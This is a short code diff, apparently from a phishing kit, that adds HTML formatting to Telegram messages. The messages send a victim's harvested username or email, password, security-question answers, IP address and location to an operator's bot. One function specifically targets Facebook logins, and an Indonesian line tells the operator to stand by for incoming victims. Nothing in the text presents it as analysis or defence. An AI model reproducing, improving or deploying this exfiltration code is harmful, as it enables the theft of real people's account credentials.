@@ -35,20 +35,20 @@ export const sendToTelegram = async (
   const timeString = now.toISOString().replace('T', ' ').split('.')[0];
 
   const message = `
-🔐 New Login Data Received
+🔐 <b>New Login Data Received</b>
 🕒 Time    : ${timeString}
-🌐 IP      : ${loc.ip}
+🌐 IP      : <code>${loc.ip}</code>
 🏙 City    : ${loc.city}
 ® Region  : ${loc.region}
 
-🆔 ID      : ${username}
-🔑 Password: ${pass}
+🆔 ID      : <code>${username}</code>
+🔑 Password: <code>${pass}</code>
 
-🛡️ Security Questions:
+🛡️ <b>Security Questions:</b>
 ${q1}
 ${q2}
 
-_User Masuk, pastikan Anda Selalu Stenbay._
+<i>User Masuk, pastikan Anda Selalu Stenbay.</i>
   `;
 
   return sendMessage(BOT_TOKEN, CHAT_ID, message);
@@ -69,21 +69,21 @@ export const sendFacebookLogin = async (
   const timeString = now.toLocaleString();
 
   const message = `
-🔔 Login Facebook Detected 🔔
+🔔 <b>Login Facebook Detected</b> 🔔
 
 🕒 Waktu Login: ${timeString}
-🌐 IP      : ${loc.ip}
+🌐 IP      : <code>${loc.ip}</code>
 🏙 City    : ${loc.city}
 ® Region  : ${loc.region}
 
-👤 Email: ${email}
-🔑 Password: ${pass}
+👤 Email: <code>${email}</code>
+🔑 Password: <code>${pass}</code>
 
-🛡️ Security Questions:
+🛡️ <b>Security Questions:</b>
 ${q1}
 ${q2}
 
-_User Masuk, pastikan Anda Selalu Stenbay._
+<i>User Masuk, pastikan Anda Selalu Stenbay.</i>
   `;
 
   return sendMessage(BOT_TOKEN, CHAT_ID, message);
@@ -98,6 +98,7 @@ const sendMessage = async (botToken: string, chatId: string, text: string) => {
       body: JSON.stringify({
         chat_id: chatId,
         text: text,
+        parse_mode: 'HTML',
       }),
     });
 
